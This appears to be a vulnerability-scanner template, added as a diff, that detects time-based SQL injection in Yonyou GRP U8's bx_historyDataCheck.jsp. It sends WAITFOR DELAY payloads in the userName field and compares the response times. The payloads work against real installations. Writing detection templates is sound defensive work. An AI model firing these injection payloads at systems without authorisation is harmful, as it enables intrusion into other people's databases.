@@ -1,0 +1,56 @@
+id: yonyou-sql-injection-ct-893849
+
+info:
+  name: Yonyou GRP U8 SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects SQL injection vulnerability in Yonyou GRP U8 via bx_historyDataCheck.jsp. Exploits time-based SQL injection using WAITFOR DELAY.
+
+variables:
+  sleepSecond1: '{{rand_int(3, 5)}}'
+  sleepSecond2: '{{rand_int(6, 8)}}'
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: baseline-request
+    method: POST
+    path:
+      - /u8qx/bx_historyDataCheck.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      userName=';WAITFOR DELAY '0:0:0'--&class.module.classLoader.DefaultAssertionStatus=
+    extractors:
+      - type: dsl
+        name: baseline_latency
+        dsl:
+          - response_time
+
+  - id: delay-test-1
+    method: POST
+    path:
+      - /u8qx/bx_historyDataCheck.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      userName=';WAITFOR DELAY '0:0:{{sleepSecond1}}'--&class.module.classLoader.DefaultAssertionStatus=
+    matchers:
+      - type: dsl
+        dsl:
+          - response_time - {{baseline_latency}} >= {{to_number(sleepSecond1)*1000 - 1000}}
+
+  - id: delay-test-2
+    method: POST
+    path:
+      - /u8qx/bx_historyDataCheck.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      userName=';WAITFOR DELAY '0:0:{{sleepSecond2}}'--&class.module.classLoader.DefaultAssertionStatus=
+    matchers:
+      - type: dsl
+        dsl:
+          - response_time - {{baseline_latency}} >= {{to_number(sleepSecond2)*1000 - 1000}}
